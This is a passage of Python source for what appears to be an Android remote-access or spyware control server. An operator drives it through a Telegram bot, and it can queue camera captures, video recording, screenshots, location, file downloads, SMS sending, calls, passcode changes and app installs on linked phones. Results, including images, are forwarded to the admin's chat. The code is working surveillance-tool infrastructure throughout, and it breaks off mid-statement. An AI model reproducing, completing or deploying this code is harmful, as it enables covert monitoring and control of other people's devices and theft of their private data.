        await send_message(chat_id, text[:4000], reply_markup=build_back_button())
    elif cmd == "/clear_logs":
        save_json(EVENTS_FILE, [])
        await send_admin("✅ تم مسح السجلات", reply_markup=build_back_button())
    elif cmd == "/settings":
        s = load_settings()
        await send_message(chat_id, f"⚙️ <b>الإعدادات</b>\n\n<code>{json.dumps(s, ensure_ascii=False, indent=2)}</code>", reply_markup=build_back_button())
    elif cmd == "/set_password":
        if arg1:
            s = load_settings()
            s["admin_password"] = arg1
            save_settings_data(s)
            await send_admin("✅ تم تغيير كلمة المرور", reply_markup=build_back_button())
        else:
            await send_admin("الاستخدام: /set_password كلمة_المرور_الجديدة", reply_markup=build_back_button())
    elif cmd == "/add_admin":
        await send_admin("استخدم /set_password لتغيير كلمة مرور الأدمن", reply_markup=build_back_button())
    elif cmd == "/remove_admin":
        await send_admin("الميزة غير متاحة في وضع الأدمن الواحد", reply_markup=build_back_button())
    elif cmd == "/broadcast":
        message_text = " ".join(parts[1:]) if len(parts) > 1 else ""
        if not message_text:
            await send_message(chat_id, "📢 <b>إرسال عام</b>\n\nالاستخدام: /broadcast <الرسالة>\n\nسيتم إرسال إشعار لجميع الأجهزة المتصلة.", reply_markup=build_back_button())
            return
        devices = get_devices()
        online_devices = [d for d in devices if d.get("active")]
        if not online_devices:
            await send_message(chat_id, "❌ لا توجد أجهزة متصلة حالياً.", reply_markup=build_back_button())
            return
        batch_id = str(uuid.uuid4())[:8]
        _batch_operations[batch_id] = {
            "total": len(online_devices),
            "responded": 0,
            "chat_id": chat_id,
            "msg_id": None,
            "created_at": time.time(),
            "command": "show_notification",
            "type": "broadcast",
        }
        for d in online_devices:
            cmd = queue_command(d["id"], "show_notification", {"arg": message_text})
            # Track batch membership on each command
            _pending_messages[cmd["id"]] = {
                "chat_id": chat_id,
                "message_id": None,
                "created_at": time.time(),
                "batch_id": batch_id,
            }
        resp = await send_message(
            chat_id,
            f"📢 <b>إرسال عام</b>\n\n"
            f"📨 الرسالة: <code>{message_text[:200]}</code>\n"
            f"📱 الأجهزة المستهدفة: {len(online_devices)}\n"
            f"⏳ بانتظار الاستجابة... (0/{len(online_devices)})",
            reply_markup=build_back_button()
        )
        if resp and resp.get("ok"):
            _batch_operations[batch_id]["msg_id"] = resp["result"]["message_id"]
        append_event("Broadcast sent", {"devices": len(online_devices), "message": message_text[:100]})
    elif cmd == "/all":
        subcmd = arg1
        if not subcmd:
            await send_message(chat_id,
                "🔄 <b>أمر جماعي لجميع الأجهزة</b>\n\n"
                "الاستخدام: /all <أمر>\n\n"
                "مثال:\n"
                "  /all screenshot\n"
                "  /all location\n"
                "  /all battery\n"
                "  /all info\n"
                "  /all ping\n\n"
                "⚠️ سيتم إرسال الأمر لجميع الأجهزة <b>المتصلة</b> فقط.",
                reply_markup=build_back_button())
            return
        # Validate it's a known command
        reg = COMMAND_REGISTRY.get(subcmd)
        if not reg:
            await send_message(chat_id, f"❌ أمر غير معروف: <code>{subcmd}</code>\n\nاستخدم /help لعرض قائمة الأوامر المتاحة.", reply_markup=build_back_button())
            return
        devices = get_devices()
        online_devices = [d for d in devices if d.get("active")]
        if not online_devices:
            await send_message(chat_id, "❌ لا توجد أجهزة متصلة حالياً.", reply_markup=build_back_button())
            return
        batch_id = str(uuid.uuid4())[:8]
        _batch_operations[batch_id] = {
            "total": len(online_devices),
            "responded": 0,
            "chat_id": chat_id,
            "msg_id": None,
            "created_at": time.time(),
            "command": reg["cmd"],
            "type": "batch",
        }
        for d in online_devices:
            cmd = queue_command(d["id"], reg["cmd"])
            _pending_messages[cmd["id"]] = {
                "chat_id": chat_id,
                "message_id": None,
                "created_at": time.time(),
                "batch_id": batch_id,
            }
        resp = await send_message(
            chat_id,
            f"🔄 <b>أمر جماعي</b>\n\n"
            f"📋 الأمر: {reg['desc']}\n"
            f"📱 الأجهزة المستهدفة: {len(online_devices)}\n"
            f"⏳ بانتظار الاستجابة... (0/{len(online_devices)})",
            reply_markup=build_back_button()
        )
        if resp and resp.get("ok"):
            _batch_operations[batch_id]["msg_id"] = resp["result"]["message_id"]
        append_event("Batch command", {"command": subcmd, "devices": len(online_devices)})
    elif cmd == "/maintenance":
        s = load_settings()
        s["maintenance"] = not s.get("maintenance", False)
        save_settings_data(s)
        state = "مفعّل 🔧" if s["maintenance"] else "معطّل ✅"
        await send_admin(f"🔧 وضع الصيانة: {state}", reply_markup=build_back_button())
    elif cmd == "/export_data":
        await send_admin("📤 تم تصدير البيانات", reply_markup=build_back_button())
    elif cmd == "/import_data":
        await send_admin("📥 جاهز لاستيراد البيانات", reply_markup=build_back_button())
    elif cmd == "/update_bot":
        await send_admin("🟥 البوت محدّث (v3.4)", reply_markup=build_back_button())

    # ── 200+ Device Commands from Registry ──
    elif cmd[1:] in COMMAND_REGISTRY:
        reg = COMMAND_REGISTRY[cmd[1:]]
        cmd_key = cmd[1:]
        if cmd_key in ("set_volume", "set_brightness", "set_ringtone", "set_wallpaper",
                        "open_app", "close_app", "install_app", "uninstall_app",
                        "block_app", "unblock_app", "clear_app_data", "force_stop_app",
                        "app_info", "enable_app", "disable_app", "update_app",
                        "launch_app", "kill_app", "list_files", "get_file",
                        "download_file", "delete_file", "rename_file", "copy_file",
                        "move_file", "create_folder", "search_files", "zip_files",
                        "change_passcode", "set_pin", "speak_text", "show_notification",
                        "open_url", "send_sms", "make_call", "block_number",
                        "unblock_number", "set_language", "set_timezone", "set_alarm",
                        "set_timer", "set_reminder", "dns_change", "proxy_set",
                        "apn_settings", "play_sound", "geo_add", "geo_remove"):
            params = {"arg": arg2} if arg2 else {"arg": arg1}
            await execute_device_command(chat_id, dev_id, reg["cmd"], params)
        else:
            await execute_device_command(chat_id, dev_id, reg["cmd"])
    else:
        await send_message(chat_id, f"❓ أمر غير معروف: <code>{cmd}</code>\nاستخدم /help لعرض قائمة الأوامر.", reply_markup=build_back_button())


async def handle_start(chat_id):
    text = (
        "🟥 <b>سيرفر التحكم أبو الزهراء</b>\n\n"
        "مرحباً بك في لوحة التحكم\n"
        "تحكم بجميع الأجهزة المربوطة عن بعد\n\n"
        f"🟢 وقت التشغيل: <code>{format_uptime(get_uptime())}</code>\n"
        f"📱 الأجهزة: <code>{len(get_devices())}</code>\n"
        f"📡 المنفذ: <code>{SERVER_PORT}</code>\n"
        f"🌐 النطاق: <code>{SERVER_DOMAIN}</code>"
    )
    await send_message(chat_id, text, reply_markup=build_main_menu())


async def handle_status(chat_id):
    devices = get_devices()
    online = sum(1 for d in devices if d.get("active"))
    cmds = load_json(COMMANDS_FILE, [])
    pending = sum(1 for c in cmds if c.get("status") == "pending")
    events = load_json(EVENTS_FILE, [])
    text = (
        "📊 <b>حالة السيرفر</b>\n\n"
        f"🟢 الحالة: <code>يعمل</code>\n"
        f"⏱️ وقت التشغيل: <code>{format_uptime(get_uptime())}</code>\n"
        f"📡 المنفذ: <code>{SERVER_PORT}</code>\n"
        f"🕐 الوقت: <code>{ts()}</code>\n\n"
        f"📱 الأجهزة: <code>{len(devices)}</code> (🟢 {online} متصل)\n"
        f"📨 الرسائل: <code>{messages_sent}</code>\n"
        f"📡 طلبات API: <code>{api_hits}</code>\n"
        f"📋 معلّق: <code>{pending}</code>\n"
        f"📝 الأحداث: <code>{len(events)}</code>\n"
        f"📋 إجمالي الأوامر: <code>{len(COMMAND_REGISTRY)}</code>"
    )
    await send_message(chat_id, text, reply_markup=build_back_button())


async def handle_devices(chat_id):
    devices = get_devices()
    if not devices:
        await send_message(chat_id, "📱 لا توجد أجهزة مربوطة\nاستخدم /link لإضافة جهاز", reply_markup=build_back_button())
        return
    text = "📱 <b>قائمة الأجهزة</b>\n\n"
    for d in devices:
        status = "🟢 متصل" if d.get("active") else "🔴 غير متصل"
        name = d.get("name", d.get("model", "مجهول"))
        text += f"{'─'*20}\n📱 <b>{name}</b>\n   المعرف: <code>{d['id']}</code>\n   الحالة: {status}\n   آخر ظهور: <code>{d.get('last_seen','—')}</code>\n"
    await send_message(chat_id, text, reply_markup=build_devices_menu())


async def handle_link(chat_id):
    global _last_link_code_time
    # === منع إنشاء أكواد مكررة - كود واحد فقط ===
    now = time.time()
    if now - _last_link_code_time < LINK_CODE_RATE_LIMIT:
        await send_message(chat_id, "⏱️ انتظر قليلاً قبل طلب كود جديد...", reply_markup=build_back_button())
        return
    _last_link_code_time = now

    entry = await generate_link_code()
    text = (
        "🔗 <b>ربط جهاز جديد</b>\n\n"
        f"🔑 الكود: <code>{entry['code']}</code>\n\n"
        "أدخل هذا الكود في تطبيق الأندرويد\n"
        "🔒 صالح مدى الحياة لربط جهاز واحد فقط\n\n"
        "سيتم إشعارك عند نجاح الربط"
    )
    await send_message(chat_id, text, reply_markup=build_back_button())


async def handle_unlink(chat_id, device_id):
    if not device_id:
        await send_message(chat_id, "الاستخدام: /unlink معرف_الجهاز", reply_markup=build_back_button())
        return
    if remove_device(device_id):
        await send_message(chat_id, f"✅ تم إلغاء ربط الجهاز <code>{device_id}</code>", reply_markup=build_devices_menu())
    else:
        await send_message(chat_id, f"❌ الجهاز <code>{device_id}</code> غير موجود", reply_markup=build_back_button())


async def handle_device_detail(chat_id, device_id):
    if not device_id:
        await send_message(chat_id, "الاستخدام: /device معرف_الجهاز", reply_markup=build_back_button())
        return
    d = find_device(device_id)
    if not d:
        await send_message(chat_id, f"❌ الجهاز <code>{device_id}</code> غير موجود", reply_markup=build_back_button())
        return
    status = "🟢 متصل" if d.get("active") else "🔴 غير متصل"
    text = (
        f"📱 <b>تفاصيل الجهاز</b>\n\n"
        f"{'─'*20}\n"
        f"📱 الاسم: <code>{d.get('name','—')}</code>\n"
        f"🆔 المعرف: <code>{d['id']}</code>\n"
        f"📊 الحالة: {status}\n"
        f"📱 الموديل: <code>{d.get('model','—')}</code>\n"
        f"🤖 النظام: <code>{d.get('os','—')}</code>\n"
        f"🔋 البطارية: <code>{d.get('battery','—')}%</code>\n"
        f"📶 الشبكة: <code>{d.get('network','—')}</code>\n"
        f"📍 الموقع: <code>{d.get('location','—')}</code>\n"
        f"🕐 آخر ظهور: <code>{d.get('last_seen','—')}</code>\n"
        f"📅 تاريخ التسجيل: <code>{d.get('created_at','—')}</code>"
    )
    await send_message(chat_id, text, reply_markup=build_device_menu(device_id))

# ============================================================================
# CALLBACK QUERY HANDLER
# ============================================================================

async def handle_callback_query(callback):
    cb_id = callback.get("id", "")
    data = callback.get("data", "")
    msg = callback.get("message", {})
    chat_id = msg.get("chat", {}).get("id", ADMIN_CHAT_ID)
    message_id = msg.get("message_id")

    log.info("Callback: %s from %s", data, chat_id)

    try:
        # ── Navigation ──
        if data == "back_main":
            await edit_message_text(chat_id, message_id, "📋 <b>القائمة الرئيسية</b>\nاختر:", reply_markup=build_main_menu())
            await answer_callback_query(cb_id)
            return

        if data == "menu_devices":
            await edit_message_text(chat_id, message_id, "📱 <b>الأجهزة</b>", reply_markup=build_devices_menu())
            await answer_callback_query(cb_id)
            return

        if data == "menu_help":
            text = build_help_menu()
            await edit_message_text(chat_id, message_id, text, reply_markup=build_back_button())
            await answer_callback_query(cb_id)
            return

        if data == "menu_server":
            await edit_message_text(chat_id, message_id, "🖥️ <b>إدارة السيرفر</b>", reply_markup=build_server_menu())
            await answer_callback_query(cb_id)
            return

        if data == "menu_streaming":
            devices = get_devices()
            if devices:
                kb = {
                    "inline_keyboard": [
                        [ib(f"{'🟢' if d.get('active') else '🔴'} {d.get('name', d.get('id', 'مجهول'))}", f"submenu_streaming_{d['id']}")]
                        for d in devices
                    ] + [[ib("🔙 رجوع", "back_main")]]
                }
            else:
                kb = build_back_button()
            await edit_message_text(chat_id, message_id, "📡 <b>البث المباشر</b>\nاختر جهازاً:", reply_markup=kb)
            await answer_callback_query(cb_id)
            return

        if data == "no_action":
            await answer_callback_query(cb_id, "لا يوجد إجراء")
            return

        # ── Link ──
        if data == "do_link":
            global _last_link_code_time
            now = time.time()
            if now - _last_link_code_time < LINK_CODE_RATE_LIMIT:
                await answer_callback_query(cb_id, "انتظر قليلاً...")
                return
            _last_link_code_time = now

            entry = await generate_link_code()
            text = (
                "🔗 <b>ربط جهاز جديد</b>\n\n"
                f"🔑 الكود: <code>{entry['code']}</code>\n\n"
                "أدخل هذا الكود في تطبيق الأندرويد\n"
                "🔒 صالح مدى الحياة لربط جهاز واحد"
            )
            await edit_message_text(chat_id, message_id, text, reply_markup=build_back_button("menu_devices"))
            await answer_callback_query(cb_id)
            return

        # ── Unlink ──
        if data.startswith("do_unlink_"):
            device_id = data.replace("do_unlink_", "")
            if remove_device(device_id):
                text = f"✅ تم إلغاء ربط الجهاز <code>{device_id}</code>"
                await edit_message_text(chat_id, message_id, text, reply_markup=build_devices_menu())
                await answer_callback_query(cb_id, "تم إلغاء الربط")
            else:
                await answer_callback_query(cb_id, "فشل العملية", show_alert=True)
            return

        # ── Device Selected ──
        if data.startswith("dev_"):
            device_id = data[4:]
            d = find_device(device_id)
            if d:
                status = "🟢 متصل" if d.get("active") else "🔴 غير متصل"
                text = f"📱 <b>{d.get('name', device_id)}</b>\n{status} | {d.get('model','—')}\n\nاختر إجراء:"
                await edit_message_text(chat_id, message_id, text, reply_markup=build_device_menu(device_id))
            else:
                await answer_callback_query(cb_id, "الجهاز غير موجود", show_alert=True)
            return

        # ── Category Submenus ──
        submenu_map = {
            "submenu_data": build_data_submenu,
            "submenu_social": build_social_submenu,
            "submenu_control": build_control_submenu,
            "submenu_apps": build_apps_submenu,
            "submenu_files": build_files_submenu,
            "submenu_security": build_security_submenu,
            "submenu_monitor": build_monitor_submenu,
            "submenu_syssettings": build_syssettings_submenu,
            "submenu_streaming": build_streaming_submenu,
        }
        for prefix, builder in submenu_map.items():
            if data.startswith(prefix + "_"):
                device_id = data[len(prefix)+1:]
                kb = builder(device_id)
                cat_label = prefix.replace("submenu_", "").title()
                await edit_message_text(chat_id, message_id, f"📂 <b>{cat_label} - الأوامر</b>\nاختر أمراً:", reply_markup=kb)
                await answer_callback_query(cb_id)
                return

        # ── Camera submenu ──
        if data.startswith("submenu_camera_"):
            device_id = data[len("submenu_camera_"):]
            kb = {
                "inline_keyboard": [
                    [ib("📷 كاميرا أمامية", f"exec_front_camera_{device_id}")],
                    [ib("📷 كاميرا خلفية", f"exec_back_camera_{device_id}")],
                    [ib("🎬 تسجيل فيديو", f"exec_record_video_{device_id}")],
                    [ib("🔙 رجوع", f"dev_{device_id}")],
                ]
            }
            await edit_message_text(chat_id, message_id, "📷 <b>الكاميرا</b>", reply_markup=kb)
            await answer_callback_query(cb_id)
            return

        # ── Execute command from inline button ──
        if data.startswith("exec_"):
            remainder = data[5:]  # Remove "exec_"
            # Find device_id by checking known devices (handles multi-underscore commands)
            matched = False
            for d in get_devices():
                did = d["id"]
                if remainder.endswith(f"_{did}"):
                    cmd_name = remainder[:-len(f"_{did}")]
                    reg = COMMAND_REGISTRY.get(cmd_name)
                    if reg:
                        await execute_device_command(chat_id, did, reg["cmd"], msg_id=message_id)
                        await answer_callback_query(cb_id, f"تم إرسال الأمر: {reg['desc']}")
                    else:
                        await answer_callback_query(cb_id, f"أمر غير معروف: {cmd_name}", show_alert=True)
                    matched = True
                    break
            if not matched:
                await answer_callback_query(cb_id, "جهاز غير معروف", show_alert=True)
            return

        # ── Direct cmd_ buttons (from device menu) ──
        if data.startswith("cmd_"):
            remainder = data[4:]  # Remove "cmd_"
            matched = False
            for d in get_devices():
                did = d["id"]
                if remainder.endswith(f"_{did}"):
                    cmd_name = remainder[:-len(f"_{did}")]
                    reg = COMMAND_REGISTRY.get(cmd_name)
                    if reg:
                        await execute_device_command(chat_id, did, reg["cmd"], msg_id=message_id)
                    matched = True
                    break
            if matched:
                await answer_callback_query(cb_id)
            else:
                await answer_callback_query(cb_id, "خطأ في تنفيذ الأمر", show_alert=True)
            return

        # ── Server actions ──
        if data == "srv_status":
            await handle_status(chat_id)
            await answer_callback_query(cb_id)
            return
        if data == "srv_stats":
            devices = get_devices()
            online = sum(1 for d in devices if d.get("active"))
            cmds = load_json(COMMANDS_FILE, [])
            pending = sum(1 for c in cmds if c.get("status") == "pending")
            text = f"📈 الإحصائيات: {len(devices)} أجهزة ({online} متصل), {pending} أوامر معلّقة, {messages_sent} رسالة مرسلة"
            await edit_message_text(chat_id, message_id, text, reply_markup=build_server_menu())
            await answer_callback_query(cb_id)
            return
        if data == "srv_logs":
            events = load_json(EVENTS_FILE, [])[-15:]
            text = "📝 <b>السجلات الأخيرة</b>\n\n"
            for e in events:
                text += f"[{e.get('time','')[:16]}] {e.get('event','')}\n"
            await edit_message_text(chat_id, message_id, text[:4000], reply_markup=build_server_menu())
            await answer_callback_query(cb_id)
            return
        if data == "srv_settings":
            s = load_settings()
            await edit_message_text(chat_id, message_id, f"⚙️ <b>الإعدادات</b>\n<code>{json.dumps(s, ensure_ascii=False)}</code>", reply_markup=build_server_menu())
            await answer_callback_query(cb_id)
            return
        if data == "srv_cleardata":
            save_json(COMMANDS_FILE, [])
            save_json(EVENTS_FILE, [])
            await edit_message_text(chat_id, message_id, "✅ تم مسح البيانات", reply_markup=build_server_menu())
            await answer_callback_query(cb_id, "تم مسح البيانات")
            return
        if data == "srv_backup":
            append_event("Backup created")
            await edit_message_text(chat_id, message_id, "✅ تم إنشاء نسخة احتياطية", reply_markup=build_server_menu())
            await answer_callback_query(cb_id)
            return
        if data == "srv_setpass":
            await edit_message_text(chat_id, message_id, "🔑 <b>تغيير كلمة المرور</b>\n\nأرسل /set_password <كلمة_المرور_الجديدة>", reply_markup=build_server_menu())
            await answer_callback_query(cb_id)
            return
        if data == "srv_addadmin":
            await edit_message_text(chat_id, message_id, "➕ <b>إضافة أدمن</b>\n\nأرسل /addadmin <chat_id>", reply_markup=build_server_menu())
            await answer_callback_query(cb_id)
            return
        if data == "srv_broadcast":
            await edit_message_text(chat_id, message_id, "📢 <b>إرسال عام</b>\n\nأرسل /broadcast <الرسالة>", reply_markup=build_server_menu())
            await answer_callback_query(cb_id)
            return
        if data == "srv_export":
            devices = get_devices()
            export_data = {"devices": devices, "settings": load_settings(), "commands": load_json(COMMANDS_FILE, [])}
            export_text = json.dumps(export_data, ensure_ascii=False, indent=2)[:4000]
            await edit_message_text(chat_id, message_id, f"📤 <b>تصدير البيانات</b>\n\n<code>{export_text}</code>", reply_markup=build_server_menu())
            await answer_callback_query(cb_id, "تم التصدير")
            return
        if data == "srv_import":
            await edit_message_text(chat_id, message_id, "📥 <b>استيراد البيانات</b>\n\nأرسل ملف JSON يحتوي على البيانات", reply_markup=build_server_menu())
            await answer_callback_query(cb_id)
            return
        if data == "srv_restart":
            await edit_message_text(chat_id, message_id, "🔄 <b>جاري إعادة تشغيل البوت...</b>", reply_markup=build_server_menu())
            await answer_callback_query(cb_id, "جاري إعادة التشغيل")
            try:
                import subprocess
                subprocess.Popen(["systemctl", "restart", "abu-zahra-bot.service"])
            except Exception:
                os._exit(0)
            return
        if data == "srv_maintenance":
            await edit_message_text(chat_id, message_id, "🔧 <b>الصيانة</b>\n\n✅ النظام يعمل بشكل طبيعي\n📊 وقت التشغيل: " + format_uptime(get_uptime()), reply_markup=build_server_menu())
            await answer_callback_query(cb_id)
            return

        # ── Menu category navigation (opens first device submenu) ──
        if data.startswith("menu_"):
            cat = data[5:]
            d = get_first_device()
            dev_id = d["id"] if d else "none"
            if not d:
                await answer_callback_query(cb_id, "لا يوجد جهاز مربوط", show_alert=True)
                return
            
            menu_map = {
                "data": ("📊 جمع البيانات", build_data_submenu),
                "social": ("🌐 التواصل الاجتماعي", build_social_submenu),
                "control": ("🎮 التحكم عن بعد", build_control_submenu),
                "apps": ("📦 إدارة التطبيقات", build_apps_submenu),
                "files": ("📂 إدارة الملفات", build_files_submenu),
                "security": ("🔒 الأمان", build_security_submenu),
                "monitor": ("🔍 المراقبة", build_monitor_submenu),
                "syssettings": ("⚙️ إعدادات النظام", build_syssettings_submenu),
            }
            if cat in menu_map:
                label, builder = menu_map[cat]
                await edit_message_text(chat_id, message_id, f"{label} - <b>{d.get('name', dev_id)}</b>", reply_markup=builder(dev_id))
                await answer_callback_query(cb_id)
                return

        # ── Quick Actions ──
        if data.startswith("quick_actions_"):
            device_id = data[len("quick_actions_"):]
            d = find_device(device_id)
            name = d.get("name", device_id) if d else device_id
            await edit_message_text(chat_id, message_id,
                f"⚡ <b>إجراءات سريعة</b> - {name}\n\nاختر إجراء سريع:",
                reply_markup=build_quick_actions_menu(device_id))
            await answer_callback_query(cb_id)
            return

        if data.startswith("quick_"):
            remainder = data[6:]  # Remove "quick_"
            for d in get_devices():
                did = d["id"]
                if remainder.endswith(f"_{did}"):
                    action = remainder[:-len(f"_{did}")]
                    quick_cmd_map = {
                        "screenshot": "screenshot",
                        "location": "get_location",
                        "battery": "get_battery",
                        "info": "get_info",
                        "apps": "get_apps",
                    }
                    actual_cmd = quick_cmd_map.get(action)
                    if actual_cmd:
                        await execute_device_command(chat_id, did, actual_cmd, msg_id=message_id)
                        action_labels = {
                            "screenshot": "📸 لقطة شاشة",
                            "location": "📍 الموقع",
                            "battery": "🔋 البطارية",
                            "info": "ℹ️ معلومات الجهاز",
                            "apps": "📱 التطبيقات",
                        }
                        await answer_callback_query(cb_id, f"⏳ {action_labels.get(action, action)}")
                    else:
                        await answer_callback_query(cb_id, "إجراء غير معروف", show_alert=True)
                    return
            await answer_callback_query(cb_id, "جهاز غير معروف", show_alert=True)
            return

        # ── Search select ──
        if data.startswith("search_"):
            # Reserved for future search pagination/selection
            await answer_callback_query(cb_id)
            return

        await answer_callback_query(cb_id)
    except Exception as exc:
        log.error("Callback error: %s - %s", exc, traceback.format_exc())
        await answer_callback_query(cb_id, "خطأ", show_alert=True)

# ============================================================================
# REST API ENDPOINTS
# ============================================================================

async def api_verify_link(request):
    """POST /api/verify_link - Verify link code, register device, notify admin."""
    global api_hits
    api_hits += 1
    try:
        body = await request.json()
        code = body.get("code", "").upper().strip()
        device_id = body.get("device_id", "")
        model = body.get("model", "")
        brand = body.get("brand", "")
        android = body.get("android", "")

        if not code:
            return web.json_response({"ok": False, "error": "Code required"}, status=400)

        result = await verify_link_code(code)
        if not result["ok"]:
            return web.json_response(result, status=400)

        # === تسجيل الجهاز مباشرة عند التحقق ===
        device_token = secrets.token_urlsafe(32)
        device_data = {
            "id": device_id,
            "token": device_token,
            "active": True,
            "name": model or device_id,
            "model": model,
            "brand": brand,
            "os": f"Android {android}",
            "battery": "",
            "network": "",
            "location": "",
        }
        add_device(device_data)
        await consume_link_code(code, device_id)

        # Initialize online state tracking for alerts
        _device_last_online_state[device_id] = True

        # === إشعار الأدمن بأن جهاز جديد تم ربطه ===
        try:
            await send_admin(
                f"📱 <b>تم ربط جهاز جديد!</b>\n\n"
                f"🔑 كود الربط: <code>{code}</code>\n"
                f"🆔 معرف الجهاز: <code>{device_id}</code>\n"
                f"📱 الموديل: <b>{model}</b>\n"
                f"🏢 الشركة: <b>{brand}</b>\n"
                f"🤖 أندرويد: <b>{android}</b>\n\n"
                f"✅ الجهاز متصل ومستعد لاستقبال الأوامر"
            )
        except Exception as e:
            log.error("Failed to notify admin: %s", e)
        append_event("New device linked", {"device_id": device_id, "model": model, "brand": brand})

        return web.json_response({
            "ok": True,
            "success": True,
            "device_token": device_token,
            "server_domain": SERVER_DOMAIN,
            "message": "Device linked successfully",
        })
    except Exception as exc:
        log.error("verify_link error: %s", exc)
        return web.json_response({"ok": False, "success": False, "error": str(exc)}, status=500)


async def api_register(request):
    """POST /api/register - Register device with server.
    يدعم شكلين:
    1. الجديد (التطبيق): {device_id, device_name, device_model, brand, os_version, battery, link_code}
    2. القديم: {device_id, link_code, device_info: {name, model, os, ...}}
    """
    global api_hits
    api_hits += 1
    try:
        body = await request.json()
        device_id = body.get("device_id", "")
        link_code = body.get("link_code", "").upper().strip()
        
        if not device_id or not link_code:
            return web.json_response({"ok": False, "success": False, "error": "device_id and link_code required"}, status=400)
        
        # التحقق من الكود
        result = await verify_link_code(link_code)
        if not result["ok"]:
            resp = dict(result)
            resp["success"] = False
            return web.json_response(resp, status=400)
        
        # استخراج بيانات الجهاز - يدعم الشكلين
        device_info = body.get("device_info", {})
        if not device_info:
            # الشكل الجديد من التطبيق (حقول مسطحة)
            device_info = {
                "name": body.get("device_name", device_id),
                "model": body.get("device_model", ""),
                "os": body.get("os_version", ""),
                "battery": body.get("battery", ""),
                "brand": body.get("brand", ""),
            }
        
        device_token = body.get("device_token", "")
        
        # تسجيل الجهاز
        device_data = {
            "id": device_id,
            "token": device_token or secrets.token_urlsafe(32),
            "active": True,
            "name": device_info.get("name", device_id),
            "model": device_info.get("model", ""),
            "os": device_info.get("os", ""),
            "battery": device_info.get("battery", ""),
            "brand": device_info.get("brand", ""),
            "network": "",
            "location": "",
        }
        add_device(device_data)
        await consume_link_code(link_code, device_id)
        
        # إشعار الأدمن
        await send_admin(
            f"📱 <b>تم ربط جهاز جديد!</b>\n\n"
            f"📱 الاسم: <code>{device_data['name']}</code>\n"
            f"🆔 المعرف: <code>{device_id}</code>\n"
            f"📱 الموديل: <code>{device_data['model']}</code>\n"
            f"🤖 النظام: <code>{device_data['os']}</code>",
            reply_markup=build_main_menu()
        )
        
        return web.json_response({
            "ok": True,
            "success": True,
            "device_id": device_id,
            "device_token": device_data["token"],
            "token": device_data["token"],
            "server_domain": SERVER_DOMAIN,
            "message": "تم تسجيل الجهاز بنجاح",
        })
    except Exception as exc:
        log.error("register error: %s", exc)
        return web.json_response({"ok": False, "success": False, "error": str(exc)}, status=500)


async def api_get_commands(request):
    """GET /api/commands/{device_id} - Get pending commands."""
    global api_hits
    api_hits += 1
    device_id = request.match_info.get("device_id", "")
    if not device_id:
        device_id = request.query.get("device_id", "")
    
    if not device_id:
        return web.json_response({"ok": False, "error": "device_id required"}, status=400)
    
    # Validate device token
    device_token = request.headers.get("X-Device-Token", "")
    d = get_device_by_token(device_id, device_token)
    if not d:
        return web.json_response({"ok": False, "error": "Unauthorized or device not found"}, status=401)
    
    pending = get_pending_commands(device_id)
    
    # Mark as sent locally
    commands = load_json(COMMANDS_FILE, [])
    for c in commands:
        if c.get("device_id") == device_id and c.get("status") == "pending":
            c["status"] = "sent"
            c["sent_at"] = ts()
    save_json(COMMANDS_FILE, commands)
    
    # Note: Do NOT delete Firebase commands here. The app uses Firebase polling
    # (not this REST API), and the _firebase_push_cmd_async auto-deletes each
    # specific command after 60 seconds. Deleting ALL commands here would cause
    # a race condition with the app's processing.
    
    # Update last seen
    update_device(device_id, {"active": True})
    
    # Track IP for upload identification
    peer_ip = _get_real_ip(request)
    if peer_ip and peer_ip != "127.0.0.1":
        _ip_device_map[peer_ip] = device_id
    
    return web.json_response({
        "ok": True,
        "commands": pending,
        "count": len(pending),
        "server_time": ts(),
    })


async def api_command_result(request):
    """POST /api/command_result/{command_id} - Submit command result.
    Forwards result to Telegram admin."""
    global api_hits, _processed_results
    api_hits += 1
    cmd_id = request.match_info.get("command_id", "")
    if not cmd_id:
        cmd_id = request.query.get("command_id", "")
    log.info("Command result received for cmd_id=%s from %s", cmd_id, request.remote)
    try:
        body = await request.json()
        status = body.get("status", "completed")
        result = body.get("result")

        updated = update_command_status(cmd_id, status, result)
        if not updated:
            return web.json_response({"ok": False, "error": "Command not found"}, status=404)

        device_id = updated.get("device_id", "")
        # Validate device token for this command's device
        device_token = request.headers.get("X-Device-Token", "")
        if device_id and not get_device_by_token(device_id, device_token):
            return web.json_response({"ok": False, "error": "Unauthorized"}, status=401)
        command = updated.get("command", "")
        if device_id:
            update_device(device_id, {"active": True})

        # === FORWARD RESULT TO TELEGRAM ===
        result_key = f"api:{cmd_id}"
        if result_key not in _processed_results:
            _processed_results.add(result_key)
            try:
                d = find_device(device_id) if device_id else None
                dev_name = d.get("name", device_id) if d else (device_id or "مجهول")

                # Parse result and detect images
                b64_image = None
                display_text = str(result) if result else "تم بنجاح"
                if len(display_text) > 4000:
                    display_text = display_text[:4000] + "..."

                try:
                    rj = json.loads(str(result))
                    if isinstance(rj, dict):
                        # Check for base64 image
                        for img_key in ("base64", "base64_preview", "image", "image_data"):
                            img_val = rj.get(img_key, "")
                            if img_val and len(img_val) > 1000:
                                b64_image = img_val
                                break
                        if rj.get("ok") and rj.get("message"):
                            display_text = rj["message"]
                        elif rj.get("ok") and isinstance(rj.get("data"), list):
                            count = len(rj["data"])
                            if count == 0:
                                display_text = "لا توجد بيانات"
                            elif count <= 15:
                                display_text = f"تم بنجاح - {count} عنصر\n\n<code>{json.dumps(rj['data'], ensure_ascii=False, indent=2)[:3000]}</code>"
                            else:
                                display_text = f"تم بنجاح - {count} عنصر (أول 10)\n\n<code>{json.dumps(rj['data'][:10], ensure_ascii=False, indent=2)[:2000]}</code>\n\n...و {count-10} أخرى"
                except Exception:
                    pass

                cmd_desc = command or cmd_id
                for reg_name, reg_info in COMMAND_REGISTRY.items():
                    if reg_info.get("cmd") == command:
                        cmd_desc = reg_info.get("desc", command)
                        break

                emoji = "✅" if status in ("completed", "success") else ("❌" if status == "error" else "📋")

                # Try to EDIT the pending message first
                pending = _pending_messages.pop(cmd_id, None)
                batch_id = pending.get("batch_id") if pending else None

                # === Send image directly for screenshots/camera ===
                img_sent = False
                if b64_image and command in ("screenshot", "front_camera", "back_camera"):
                    try:
                        import base64 as _b64
                        img_bytes = _b64.b64decode(b64_image)
                        if len(img_bytes) > 5000:
                            caption = f"{emoji} {dev_name} - {cmd_desc}"
                            photo_resp = await send_photo(ADMIN_CHAT_ID, img_bytes, caption=caption)
                            if photo_resp and photo_resp.get("ok"):
                                img_sent = True
                    except Exception:
                        pass

                msg = (
                    f"{emoji} <b>نتيجة الأمر</b>\n\n"
                    f"📱 الجهاز: <code>{dev_name}</code>\n"
                    f"📋 الأمر: {cmd_desc}\n"
